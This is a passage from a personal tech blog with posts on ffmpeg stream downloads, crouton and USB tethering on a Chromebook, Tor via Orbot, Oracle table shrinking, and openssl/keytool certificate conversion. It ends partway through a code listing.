<li>Install ffmpeg<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:mc3man/trusty-media</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install ffmpeg gstreamer0.10-ffmpeg</span><br></pre></td></tr></table></figure></li>
<li>find m3u8 url in Chrome Cache View</li>
<li>run<br><code>ffmpeg -i http://stmw.rthk.hk/aod/_definst_/radio/archive/radio1/City_Snapshot/mp3/mp3:20150413.mp3/playlist.m3u8 -c copy City_Snapshot-20150413-.mp3</code> to download</li>
</ul>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference:"></a>Reference:</h1><h2 id="GnuPG"><a href="#GnuPG" class="headerlink" title="GnuPG"></a>GnuPG</h2><p><a target="_blank" rel="noopener" href="http://www.pgpi.org/doc/pgpintro/">http://www.pgpi.org/doc/pgpintro/</a><br><a target="_blank" rel="noopener" href="http://www.hanewin.net/encrypt/PGcrypt.htm">http://www.hanewin.net/encrypt/PGcrypt.htm</a><br><a target="_blank" rel="noopener" href="http://support.gpgtools.org/kb/gpgservices-faq/how-to-encrypt-and-sign-text-or-files-with-gpgservices">http://support.gpgtools.org/kb/gpgservices-faq/how-to-encrypt-and-sign-text-or-files-with-gpgservices</a><br><a target="_blank" rel="noopener" href="http://science.opposingviews.com/decrypt-file-using-pgp-23391.html">http://science.opposingviews.com/decrypt-file-using-pgp-23391.html</a><br><a href="ftp://ftp.pgpi.org/pub/pgp/6.5/docs/english/PGPCmdLineGuide.pdf">ftp://ftp.pgpi.org/pub/pgp/6.5/docs/english/PGPCmdLineGuide.pdf</a><br><a target="_blank" rel="noopener" href="http://askubuntu.com/questions/100281/how-do-i-make-a-pgp-key">http://askubuntu.com/questions/100281/how-do-i-make-a-pgp-key</a><br><a target="_blank" rel="noopener" href="https://help.ubuntu.com/community/GnuPrivacyGuardHowto">https://help.ubuntu.com/community/GnuPrivacyGuardHowto</a><br><a target="_blank" rel="noopener" href="http://www.techrepublic.com/blog/linux-and-open-source/encrypting-and-decrypting-files-with-gnupg/">http://www.techrepublic.com/blog/linux-and-open-source/encrypting-and-decrypting-files-with-gnupg/</a><br><a target="_blank" rel="noopener" href="http://ubuntuforums.org/showthread.php?t=680292">http://ubuntuforums.org/showthread.php?t=680292</a><br><a target="_blank" rel="noopener" href="http://askubuntu.com/questions/332020/how-do-i-import-a-private-key-into-gpg-so-that-it-becomes-the-default-key">http://askubuntu.com/questions/332020/how-do-i-import-a-private-key-into-gpg-so-that-it-becomes-the-default-key</a><br><a target="_blank" rel="noopener" href="https://www.madboa.com/geek/gpg-quickstart/">https://www.madboa.com/geek/gpg-quickstart/</a><br><a target="_blank" rel="noopener" href="http://www.spywarewarrior.com/uiuc/gpg/gpg-com-4.htm">http://www.spywarewarrior.com/uiuc/gpg/gpg-com-4.htm</a></p>
<h2 id="Download-m3u8"><a href="#Download-m3u8" class="headerlink" title="Download m3u8"></a>Download m3u8</h2><p><a target="_blank" rel="noopener" href="http://swimminginthought.com/download-m3u8-file/">http://swimminginthought.com/download-m3u8-file/</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Things-on-Chromebook" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2015-03-12T00:22:55.000Z"><a href="/2015/03/12/Things-on-Chromebook/">2015-03-12</a></time>
      
      
  
    <h1 class="title"><a href="/2015/03/12/Things-on-Chromebook/">Things on Chromebook</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <p>I am pleased for the performance and design with my chromebook Acer C720.<br>I had installed crouton by following the procedure,</p>
<ul>
<li>Enable develop mode -&gt; esc + refresh + power button, then crtl + d.</li>
<li>Open crosh window by crtl + alt + t, type <code>shell</code>, run <code>sudo sh -e ./crouton -t xfce</code> the default system installed in your chroot will be ubuntu 12.04 precise. To see the usage of crouton, <code>sh ./crouton -h</code> or <code>sh ./crouton -t list</code> or <code>sh ./crouton -r list</code></li>
<li>Do not use the argument -P which install crouton via proxy, since opengpg verification would be failed by proxy, then process will pause.</li>
<li>To enter into ubuntu, just type <code>sudo enter-chroot</code> or <code>sudo startxfce4</code>, switch system by crtl + alt + forward then refresh and crtl + alt + backward</li>
<li>Recommend to install crouton integration extension in chrome from web store in google</li>
<li>Update ubuntu, <code>sudo sh ./crouton -u -t xiwi,extension,keyboard</code>, target xiwi should be placed at first, then <code>sudo startxfce4 -b</code>, ubuntu will run in a chrome tab, that is amazing. An issue encounterred when install xiwi is missing the dependency xserver-xorg-core, <code>sudo enter-chroot</code> then <code>sudo apt-get install xserver-xorg-core</code></li>
<li>Some things to do after installing ubuntu, such as <code>sudo apt-get purge xcreensaver</code>, install leafpad, VLC etc.</li>
</ul>
<p>I would like to leverage usb tethering insteads of wifi tethering from my phone. At beginning, I had tried easytether wihch works perfectly with my dual systems, but the lite version only support http, not include https. I have to find another way to surf internet using usb tethering.</p>
<ul>
<li><p>To run easytether, install easytether lite from google play, in ubuntu, run <code>sudo apt-get install libusb-1.0.0</code> and <code>sudo dpkg -i easytether_0.7.4-1_i386.deb</code>, it will install the easytether package in your system, type <code>easytether connect</code>, allow the connection in your phone, a new net interface will appear by <code>ip addr</code></p>
</li>
<li><p>Another way to usb tethering, install adb in ubuntu, socks proxy way to surf intenet. Add ppa repository as below,</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install software-properties-common</span><br><span class="line">sudo apt-get install python-software-properties # to add apt-add-repository utility</span><br><span class="line">sudo add-apt-repository ppa:nilarimogard/webupd8</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install android-tools-adb</span><br><span class="line">sudo apt-get install android-tools-fastboot</span><br><span class="line">sudo apt-get install usbutils # to add lsusb command</span><br></pre></td></tr></table></figure>
</li>
<li><p>Install tools to create a virtual interface to let chromeos can connet to an Ethenent<br><code>sudo apt-get install bridge-utils uml-utilities iptables</code></p>
</li>
<li><p>bridge-utils for brctl</p>
</li>
<li><p>uml-utilities for tunctl<br>Add following rule in file <strong>&#x2F;etc&#x2F;udev&#x2F;rules.d&#x2F;99-android.rules</strong><br><code>SUBSYSTEM==&quot;usb&quot;, ATTR&#123;idVendor&#125;==&quot;0fce&quot;, ATTR&#123;idProduct&#125;==&quot;61a9&quot;, MODE=&quot;0666&quot;, GROUP=&quot;plugdev&quot;</code><br><code>sudo service udev restart</code><br>Plug my phone to chromebook, type <code>lsusb</code>, my phone can be recognized as <code>Bus 001 Device 005: ID 0fce:61a9 Sony Ericsson Mobile Communications AB</code>.</p>
</li>
<li><p>Follow these steps to connect internet with usb tethering</p>
</li>
<li><p>run below script<br><code>adb forward tcp:41927 tcp:41927</code><br><code>adb forward --list</code></p>
</li>
<li><p>At mobile, run AzLink, at ubuntu run <code>openvpn azilink.ovpn</code></p>
</li>
<li><p>Add bridge interface by</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">brctl addbr br0</span><br><span class="line">ifconfig br0 192.168.56.3 netmask 255.255.255.0 up</span><br><span class="line">iptables -I FORWARD -i tun0 -o br0 -j ACCEPT</span><br><span class="line">iptables -I FORWARD -i br0 -o tun0 -j ACCEPT</span><br><span class="line">iptables -t nat -A POSTROUTING -o tun0 -j MASQUERADE</span><br><span class="line">echo “nameserver 8.8.8.8 8.8.4.4” &gt; /etc/resolv.conf</span><br></pre></td></tr></table></figure></li>
<li><p>At this time, ubuntu can already connect to internet, but chromeos cannot. You need to setup internet connection at Setting Pannel, you just confirm the setting, nothing need to input, then you will see “Conneted to Ethernet”, chromeos now can surf internet.<br>If you find the “The Web page is not available” message suddenly, you may re-configure the file &#x2F;etc&#x2F;resolv.conf with <code>nameserver 8.8.8.8 8.8.4.4</code> or <code>nameserver 192.168.56.1</code></p>
</li>
<li><p>Chinese display</p>
</li>
<li><p>Check locales &#x2F;usr&#x2F;share&#x2F;i18n&#x2F;SUPPORTED, &#x2F;usr&#x2F;share&#x2F;locale, &#x2F;usr&#x2F;lib&#x2F;locale</p>
</li>
<li><p>Add zh_CN.UTF-8 in &#x2F;var&#x2F;lib&#x2F;locales&#x2F;supported.d&#x2F;local</p>
<ul>
<li>re-gen locale : <code>sudo locale-gen</code> <code>sudo dpkg-reconfigure locales</code></li>
<li>Add environment: add zh_CN.UTF-8 in &#x2F;etc&#x2F;environment</li>
<li>change default language, just export LANG&#x3D;en_US.UTF-8 or zh_CN.UTF-8</li>
<li>Install zh_TW and zh_HK by <code>sudo apt-get install language-support-fonts-zh-hant</code></li>
<li>Install chinese fonts by <code>sudo apt-get install xfonts-wqy</code></li>
<li>Refer to <a target="_blank" rel="noopener" href="http://www.davidpai.tw/ubuntu/2011/ubuntu-set-locale/">http://www.davidpai.tw/ubuntu/2011/ubuntu-set-locale/</a></li>
</ul>
</li>
<li><p>Fix issue of no sound in crouton<br> Test sound <code>$ sudo enter-chroot aplay /usr/share/sounds/alsa/Front_Center.wav</code><br> Re-install pulseaudio and alsa-base</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install mplayer smplayer ubuntu-restricted-extras</span><br><span class="line">sudo apt-get remove --purge pulseaudio alsa-base</span><br><span class="line">sudo apt-get install pulseaudio alsa-base</span><br></pre></td></tr></table></figure></li>
<li><p>Install latest version of git and golang</p>
<figure class="highlight plaintext"><figcaption><span>add-apt-repository ppa:git-core/ppa</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:bcandrea/backports</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install git</span><br><span class="line">sudo apt-get install golang</span><br><span class="line">sudo go get github.com/djimenez/iconv-go // Install chinese encoding package</span><br></pre></td></tr></table></figure>
</li>
<li><p>Connect to RPi with adafruit serial cable <code>sudo screen /dev/ttyUSB0 115200</code></p>
</li>
<li><p>Install Android Runtime for Chrome and ARC Welder to launch Android app to play with .</p>
</li>
<li><p>Tor on ChromeOS</p>
</li>
<li><p>Install apps of Orbot and Proxy Server on android mobile</p>
</li>
<li><p>Start Orbot, setup port forward on Proxy Server 127.0.0.1:8080 -&gt; 127.0.0.1:8118 (Orbot service)</p>
</li>
<li><p>In crosh, type <code>adb forward tcp:8080 tcp:8080</code></p>
</li>
<li><p>Ensure ChromeOS has a IP (assigned by wifi or bridged), configure the proxy as 127.0.0.1:8080</p>
</li>
<li><p>Now it is time to access following urls,<br> <a target="_blank" rel="noopener" href="http://check.torproject.org/">http://check.torproject.org/</a><br> <a target="_blank" rel="noopener" href="https://duckduckgo.com/">https://duckduckgo.com/</a><br> <a target="_blank" rel="noopener" href="https://www.tor2web.org/">https://www.tor2web.org/</a> <a target="_blank" rel="noopener" href="http://thehiddenwiki.org/">http://thehiddenwiki.org/</a></p>
</li>
<li><p>Install tor-browser (it is firefox based) in ubuntu</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo vi /etc/apt/apt.conf.d/10proxy (Acquire::http::Proxy &quot;http://192.168.137.1:21/&quot;;)</span><br><span class="line">export http://192.168.137.1:21/</span><br><span class="line">export http_proxy=http://192.168.137.1:21/</span><br><span class="line">export https_proxy=http://192.168.137.1:21/</span><br><span class="line">sudo -E add-apt-repository ppa:webupd8team/tor-browser</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install tor-browser</span><br></pre></td></tr></table></figure></li>
<li><p>If you do not want to surf internet with Tor, just stop Orbot and Proxy Server, start Proxoid</p>
</li>
</ul>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference:"></a>Reference:</h1><p><a target="_blank" rel="noopener" href="http://www.omgchrome.com/an-introduction-to-tor-on-chrome-os/">http://www.omgchrome.com/an-introduction-to-tor-on-chrome-os/</a><br><a target="_blank" rel="noopener" href="https://docs.google.com/document/d/1I1lBG1P2GOf3ooNhX-5pyrVF6RnxmpuEw62pi17Tb0I/edit">https://docs.google.com/document/d/1I1lBG1P2GOf3ooNhX-5pyrVF6RnxmpuEw62pi17Tb0I/edit</a><br><a target="_blank" rel="noopener" href="http://www.ubertechblog.com/2011/07/beginners-guide-to-deep-web-or-darknet.html">http://www.ubertechblog.com/2011/07/beginners-guide-to-deep-web-or-darknet.html</a></p>
<h1 id="Fix-issue-of-“read-from-TUN-x2F-TAP-File-descriptor-in-bad-state-code-x3D-77-”-when-run-openvpn-azilink-ovpn-after-upgrading-chromeos"><a href="#Fix-issue-of-“read-from-TUN-x2F-TAP-File-descriptor-in-bad-state-code-x3D-77-”-when-run-openvpn-azilink-ovpn-after-upgrading-chromeos" class="headerlink" title="Fix issue of “read from TUN&#x2F;TAP : File descriptor in bad state (code&#x3D;77)” when run openvpn azilink.ovpn after upgrading chromeos"></a>Fix issue of “read from TUN&#x2F;TAP : File descriptor in bad state (code&#x3D;77)” when run <code>openvpn azilink.ovpn</code> after upgrading chromeos</h1><p>  Run the following command in your shell on ChromeOS (the shell, not crosh)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo stop shill</span><br><span class="line">sudo start shill BLACKLISTED_DEVICES=tun0</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-when-to-use-rebuild-vs-coalesce-vs-shrink" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2015-01-15T04:07:07.000Z"><a href="/2015/01/15/when-to-use-rebuild-vs-coalesce-vs-shrink/">2015-01-15</a></time>
      
      
  
    <h1 class="title"><a href="/2015/01/15/when-to-use-rebuild-vs-coalesce-vs-shrink/">when-to-use-rebuild-vs-coalesce-vs-shrink</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <ul>
<li>Find out the table size<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SELECT owner, segment_name, segment_type, partition_name, ROUND(bytes/(1024*1024),2) SIZE_MB, tablespace_name</span><br><span class="line">FROM DBA_SEGMENTS</span><br><span class="line">WHERE SEGMENT_TYPE IN (&#x27;TABLE&#x27;, &#x27;TABLE PARTITION&#x27;, &#x27;TABLE SUBPARTITION&#x27;,</span><br><span class="line">&#x27;INDEX&#x27;, &#x27;INDEX PARTITION&#x27;, &#x27;INDEX SUBPARTITION&#x27;, &#x27;TEMPORARY&#x27;, &#x27;LOBINDEX&#x27;, &#x27;LOBSEGMENT&#x27;, &#x27;LOB PARTITION&#x27;)</span><br><span class="line">--AND TABLESPACE_NAME LIKE &#x27;COSTE%&#x27;</span><br><span class="line">--AND SEGMENT_NAME LIKE &#x27;P2010201%&#x27;</span><br><span class="line">--AND partition_name LIKE &#x27;P20100201%&#x27;</span><br><span class="line">--AND segment_type = &#x27;TABLE&#x27;</span><br><span class="line">--AND OWNER = &#x27;TARGET_POC&#x27;</span><br><span class="line">--AND ROUND(bytes/(1024*1024),2) &gt; 1000</span><br><span class="line">ORDER BY bytes DESC;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>You can group by tablespace, owner and segment type and see the total space occupied in MBytes</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT tablespace_name, owner, segment_type &quot;Object Type&quot;,</span><br><span class="line">   COUNT(owner) &quot;Number of Objects&quot;,</span><br><span class="line">   ROUND(SUM(bytes) / 1024 / 1024, 2) &quot;Total Size in MB&quot;</span><br><span class="line">FROM   sys.dba_segments</span><br><span class="line">WHERE  tablespace_name IN (&#x27;MPIS&#x27;)</span><br><span class="line">GROUP BY tablespace_name, owner, segment_type</span><br><span class="line">ORDER BY tablespace_name, owner, segment_type;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>find out the usage of tablespace</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">select df.tablespace_name &quot;Tablespace&quot;,</span><br><span class="line">totalusedspace &quot;Used MB&quot;,</span><br><span class="line">(df.totalspace - tu.totalusedspace) &quot;Free MB&quot;,</span><br><span class="line">df.totalspace &quot;Total MB&quot;,</span><br><span class="line">round(100 * ( (df.totalspace - tu.totalusedspace)/ df.totalspace))</span><br><span class="line">&quot;Pct. Free&quot;</span><br><span class="line">from</span><br><span class="line">(select tablespace_name,</span><br><span class="line">round(sum(bytes) / 1048576) TotalSpace</span><br><span class="line">from dba_data_files</span><br><span class="line">group by tablespace_name) df,</span><br><span class="line">(select round(sum(bytes)/(1024*1024)) totalusedspace, tablespace_name</span><br><span class="line">from dba_segments</span><br><span class="line">group by tablespace_name) tu</span><br><span class="line">where df.tablespace_name = tu.tablespace_name order by &quot;Pct. Free&quot;;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Shrink table</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alter table STATS$SQL_SUMMARY enable row movement;</span><br><span class="line">alter table STATS$SQL_SUMMARY shrink space;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Shrink index</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">alter index STATS$SQL_SUMMARY_PK shrink space compact</span><br><span class="line">alter index STATS$SQL_SUMMARY_PK shrink space;</span><br><span class="line">alter index STATS$SYSSTAT_PK coalesce</span><br><span class="line">alter index STATS$SQL_SUMMARY_PK rebuild</span><br><span class="line">shrink space compact = coalesce</span><br></pre></td></tr></table></figure>

</li>
<li><p>Reference<br><a target="_blank" rel="noopener" href="https://richardfoote.files.wordpress.com/2007/12/when-to-use-rebuild-vs-coalesce-vs-shrink-space.pdf">when-to-use-rebuild-vs-coalesce-vs-shrink-space</a><br><a target="_blank" rel="noopener" href="http://blog.sina.com.cn/s/blog_7c21b5d90101gw8r.html">深入理解重建索引</a><br><a target="_blank" rel="noopener" href="http://www.askmaclean.com/archives/alter-index-coalesce-vs-shrink-space.html">Alter index coalesce VS shrink space</a><br><a target="_blank" rel="noopener" href="http://blog.csdn.net/techchan/article/details/6693275">alter index coalesce和alter index rebuild的区别</a></p>
</li>
</ul>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Learn-certificate-revocation-list" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2014-12-18T08:04:15.000Z"><a href="/2014/12/18/Learn-certificate-revocation-list/">2014-12-18</a></time>
      
      
  
    <h1 class="title"><a href="/2014/12/18/Learn-certificate-revocation-list/">Learn certificate revocation list</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <p>jks -&gt; p12 p12 -&gt; pem (cer) pem (cer) -&gt; der</p>
<ul>
<li>Convert a DER crl to PEM <code>openssl crl -CAfile root.pem eCertCA1-10CRL2.pem</code></li>
<li>java keytool <code>keytool -trustcacerts -import -alias alias -keystore cacerts.jks -file prod.der</code> <code>keytool -v -importkeystore -srckeystore cacerts3.jks -srcalias alias -destkeystore temp.p12 -deststoretype PKCS12 -srcstorepass password -deststorepass 1304478222600604</code> <code>keytool -list -v -keystore xxp12 -storepass 112233 -storetype pkcs12</code></li>
<li>export private key <code>openssl pkcs12 -in prod.cer -out csr_private.key -nocerts -nodes -password pass:1304478222600604</code></li>
<li>print basic information in p12 <code>openssl pkcs12 -in xx.p12 -clcerts -nokeys|openssl x509 -text -noout</code></li>
<li>print information in PEM format certificate <code>openssl x509 -in certificate.crt -text -noout</code></li>
<li>Export DER and PEM encoded certificate By java<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for(String alias : keyStore.aliases())&#123;</span><br><span class="line">  if (keyStore.isKeyEntry(alias)) &#123;</span><br><span class="line">    certificate = ((X509Certificate) keyStore.getCertificate(alias);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">byte[] cert_der_format = certificate.getEncoded(); // DER Encoded String cert_pem_format = X509Factory.BEGIN_CERT + new String(BASE64EnCoder.encode(cert_der_format)) + “\n” + X509Factory.END_CERT; // PEM Encoded</span><br></pre></td></tr></table></figure>

 By Keytool</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">keytool -exportcert -alias herong_key -keypass keypass -keystore herong.jks -storepass jkspass -file keytool_crt.der</span><br><span class="line">keytool -exportcert -alias herong_key -keypass keypass -keystore herong.jks -storepass jkspass -rfc -file keytool_crt.pem</span><br></pre></td></tr></table></figure>

<ul>
<li>Methods for getting certificate information<br> By keytool <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">keytool -list -v -keystore abc.p12 -storepass 1234 -storetype pkcs12</span><br><span class="line">keytool -printcert -file keytool_crt.pem</span><br></pre></td></tr></table></figure>

 By openssl</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -in keytool_crt.pem -text -noout`</span><br><span class="line">openssl x509 -in keytool_crt.der -inform der -text -noout</span><br></pre></td></tr></table></figure>

<ul>
<li>Convert p12 file from cert.p12 to cert2.p12 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -clcerts -nokeys -in cert.p12 -out usercert.pem // public key</span><br><span class="line">openssl pkcs12 -nocerts -in cert.p12 -out userkey.pem // private key</span><br></pre></td></tr></table></figure>
  Merge it<br><code>openssl pkcs12 -export -out cert2.p12 -inkey ./userkey.pem -in ./usercert.pem</code></li>
</ul>
<p><a target="_blank" rel="noopener" href="https://svn.cesecore.eu/svn/ejbca/branches/Branch_3_2_3_utf8/ejbca/doc/samples/ValidateCertUseCRL.java">java ValidateCertUseCRL</a><br><a target="_blank" rel="noopener" href="https://support.ssl.com/Knowledgebase/Article/View/19/0/der-vs-crt-vs-cer-vs-pem-certificates-and-how-to-convert-them">DER vs. CRT vs. CER vs. PEM Certificates and How To Convert Them</a><br><a target="_blank" rel="noopener" href="http://www.planetlarg.net/encyclopedia/ssl-secure-sockets-layer/der-distinguished-encoding-rules-certificate-encoding">DER (Distinguished Encoding Rules) certificate encoding</a><br><a target="_blank" rel="noopener" href="http://security.stackexchange.com/questions/58301/verify-certificate-is-revoked-by-crl">Verify Certificate is revoked by CRL</a><br><a target="_blank" rel="noopener" href="http://sycure.wordpress.com/2008/05/15/tips-using-openssl-to-extract-private-key-pem-file-from-pfx-personal-information-exchange/">Using openssl to extract private key</a><br><a target="_blank" rel="noopener" href="https://www.sslshopper.com/ssl-converter.html">SSL Converter</a><br><a target="_blank" rel="noopener" href="https://www.sslshopper.com/article-most-common-openssl-commands.html">article-most-common-openssl-commands</a><br><a target="_blank" rel="noopener" href="http://srdevspot.blogspot.hk/2011/08/openssl-error0906d064pem.html">normalize your certificate</a><br><a target="_blank" rel="noopener" href="https://www.bo.infn.it/alice/introgrd/certmgr/node2.html">Certificates: File Format &amp; Conversion</a><br><a target="_blank" rel="noopener" href="http://www.herongyang.com/Cryptography/Certificate-Format-keytool-Export-in-DER-and-PEM.html">keytool Exporting Certificates in DER and PEM</a><br><a target="_blank" rel="noopener" href="http://www.herongyang.com/Cryptography/OpenSSL-Certificate-Path-Validation.html">OpenSSL Validating Certificate Path</a><br><a target="_blank" rel="noopener" href="http://www.herongyang.com/Cryptography/Certificate-Format-keytool-View-in-DER-and-PEM.html">“keytool” Viewing Certificates in DER and PEM</a></p>
<ul>
<li>No way to get CRL path using api from ibm jar, just find keyword <strong>CRLDistributionPoints</strong> by toString getExtension(new ObjectIdentifier(key)) as below;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span 